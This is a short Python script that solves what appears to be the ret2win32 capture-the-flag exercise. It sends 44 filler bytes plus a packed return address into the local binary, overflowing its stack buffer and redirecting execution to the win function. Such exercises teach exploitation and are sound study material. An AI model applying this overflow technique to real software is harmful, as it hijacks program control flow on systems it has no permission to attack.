#!/usr/bin/python

import os, struct

ret2win = struct.pack("I", 0x08048659)

payload = "A"*44 + ret2win

r = os.popen('./ret2win32', 'w')
r.write(payload)
